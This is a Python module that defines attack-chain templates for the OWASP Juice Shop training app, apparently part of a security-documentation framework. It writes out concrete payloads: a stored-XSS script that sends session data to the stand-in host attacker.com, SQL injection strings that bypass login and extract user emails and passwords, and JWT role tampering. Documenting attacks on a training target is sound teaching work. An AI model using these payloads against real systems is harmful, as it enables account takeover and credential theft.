#!/usr/bin/env python3
"""
OWASP Juice Shop - Attack Chain Templates
Author: Victor Ibhafidon

Pre-built attack chain templates for OWASP Juice Shop.
These templates provide starting points for documenting discovered attack chains.

HOW IT CONNECTS TO THE FRAMEWORK:
- Uses chain_analyzer.py to create AttackChain objects
- Templates can be loaded and customized for specific findings
- Integrates with visualizer.py for diagram generation
- Used by discover_chains.py for Juice Shop analysis

USAGE:
 from chains.chain_templates.juice_shop_templates import get_juice_shop_templates
 
 templates = get_juice_shop_templates()
 for template in templates:
 # Customize template with your findings
 chain = template
 chain.add_step(...)
"""

import sys
import os

# Add chains directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from chain_analyzer import (
 ChainAnalyzer, ChainStep, VulnerabilityType, ImpactLevel
)

def create_xss_to_admin_chain():
 """
 Template: XSS to Admin Account Takeover
 
 This is one of the most common attack chains in Juice Shop.
 Stored XSS in product reviews leads to session hijacking and admin access.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="Juice Shop - XSS to Admin Account Takeover",
 description="Stored XSS in product review leads to session hijacking and admin access",
 impact=ImpactLevel.CRITICAL
 )
 
 chain.prerequisites = [
 "Valid user account",
 "Ability to post product reviews"
 ]
 chain.context = "OWASP Juice Shop e-commerce application"
 chain.tags = {"xss", "session-hijacking", "privilege-escalation", "web", "juice-shop"}
 chain.severity = "Critical"
 
 # Step 1: Stored XSS
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.XSS,
 description="Stored XSS in product review comment field",
 endpoint="/rest/products/{id}/reviews",
 payload="<script>fetch('/rest/user/whoami', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+btoa(JSON.stringify(d))))</script>",
 outcome="XSS payload stored in product review"
 )
 
 # Step 2: Session Hijacking
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.SESSION_HIJACKING,
 description="XSS payload executes when admin views review, stealing session token",
 endpoint="Admin panel / product reviews",
 prerequisites=["XSS payload stored in product review"],
 payload="Stolen JWT token from admin session",
 outcome="Admin session token obtained"
 )
 
 # Step 3: Admin Access
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.PRIV_ESCALATION,
 description="Use stolen admin token to access admin panel",
 endpoint="/#/administration",
 prerequisites=["Admin session token obtained"],
 payload="Authorization: Bearer <stolen_token>",
 outcome="Unauthorized admin access achieved"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def create_sql_injection_chain():
 """
 Template: SQL Injection to Data Exfiltration
 
 SQL injection in login or search leads to database access and data exfiltration.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="Juice Shop - SQL Injection to Data Exfiltration",
 description="SQL injection vulnerability leads to database access and sensitive data exfiltration",
 impact=ImpactLevel.HIGH
 )
 
 chain.prerequisites = [
 "Access to login or search functionality"
 ]
 chain.context = "OWASP Juice Shop e-commerce application"
 chain.tags = {"sql-injection", "data-exfiltration", "database", "juice-shop"}
 chain.severity = "High"
 
 # Step 1: SQL Injection Discovery
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.SQL_INJECTION,
 description="SQL injection in login or search field",
 endpoint="/rest/user/login or /rest/products/search",
 payload="admin' OR '1'='1'--",
 outcome="SQL injection vulnerability confirmed"
 )
 
 # Step 2: Database Enumeration
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.SQL_INJECTION,
 description="Enumerate database structure and extract table names",
 endpoint="Same as Step 1",
 prerequisites=["SQL injection vulnerability confirmed"],
 payload="' UNION SELECT table_name FROM information_schema.tables--",
 outcome="Database structure enumerated"
 )
 
 # Step 3: Data Exfiltration
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.SQL_INJECTION,
 description="Extract sensitive user data (passwords, emails, credit cards)",
 endpoint="Same as Step 1",
 prerequisites=["Database structure enumerated"],
 payload="' UNION SELECT email, password FROM Users--",
 outcome="Sensitive data exfiltrated"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def create_authentication_bypass_chain():
 """
 Template: Authentication Bypass to Privilege Escalation
 
 Authentication bypass leads to unauthorized access and privilege escalation.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="Juice Shop - Authentication Bypass to Privilege Escalation",
 description="Authentication bypass vulnerability allows unauthorized access and privilege escalation",
 impact=ImpactLevel.CRITICAL
 )
 
 chain.prerequisites = [
 "Knowledge of authentication mechanism",
 "Access to login endpoint"
 ]
 chain.context = "OWASP Juice Shop e-commerce application"
 chain.tags = {"auth-bypass", "privilege-escalation", "jwt", "juice-shop"}
 chain.severity = "Critical"
 
 # Step 1: JWT Token Manipulation
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.AUTH_BYPASS,
 description="Manipulate JWT token to bypass authentication",
 endpoint="/rest/user/login",
 payload="Modified JWT token with 'role': 'admin'",
 outcome="Authentication bypassed"
 )
 
 # Step 2: Unauthorized Access
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.PRIV_ESCALATION,
 description="Access admin endpoints with manipulated token",
 endpoint="/rest/admin/application-configuration",
 prerequisites=["Authentication bypassed"],
 payload="Authorization: Bearer <manipulated_token>",
 outcome="Unauthorized admin access"
 )
 
 # Step 3: System Compromise
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.BUSINESS_LOGIC,
 description="Modify application configuration or user data",
 endpoint="/rest/admin/*",
 prerequisites=["Unauthorized admin access"],
 outcome="System configuration compromised"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def get_juice_shop_templates():
 """
 Get all Juice Shop attack chain templates.
 
 Returns:
 List of tuples (analyzer, chain) for each template
 """
 templates = []
 
 # XSS to Admin chain
 analyzer1, chain1 = create_xss_to_admin_chain()
 templates.append((analyzer1, chain1))
 
 # SQL Injection chain
 analyzer2, chain2 = create_sql_injection_chain()
 templates.append((analyzer2, chain2))
 
 # Authentication Bypass chain
 analyzer3, chain3 = create_authentication_bypass_chain()
 templates.append((analyzer3, chain3))
 
 return templates

def export_all_templates(output_dir: str = "chains/chain_templates/exports"):
 """
 Export all templates to JSON files.
 
 Args:
 output_dir: Directory to save exported templates
 """
 import os
 os.makedirs(output_dir, exist_ok=True)
 
 templates = get_juice_shop_templates()
 
 for analyzer, chain in templates:
 # Create filename from chain title
 filename = chain.title.lower().replace(" ", "_").replace("-", "_")
 filename = filename.replace("juice_shop_", "").replace("owasp_", "")
 filename = f"{filename}.json"
 filepath = os.path.join(output_dir, filename)
 
 analyzer.export_chain(chain, filepath)
 print(f" Exported: {filepath}")
 
 print(f"\n Exported {len(templates)} Juice Shop templates to {output_dir}/")

if __name__ == "__main__":
 print("=" * 80)
 print("OWASP JUICE SHOP - ATTACK CHAIN TEMPLATES")
 print("=" * 80)
 print()
 
 templates = get_juice_shop_templates()
 
 for analyzer, chain in templates:
 print(f"\n Template: {chain.title}")
 print(f" Impact: {chain.impact.value}")
 print(f" Steps: {len(chain.steps)}")
 print(f" Tags: {', '.join(sorted(chain.tags))}")
 
 # Validate
 is_valid, issues = chain.validate_chain()
 if is_valid:
 print(" Valid chain")
 else:
 print(f" Validation issues: {len([i for i in issues if i.startswith('')])}")
 
 print("\n" + "=" * 80)
 print(f"Total Templates: {len(templates)}")
 print("=" * 80)
 
 # Export templates
 print("\n Exporting templates...")
 export_all_templates()

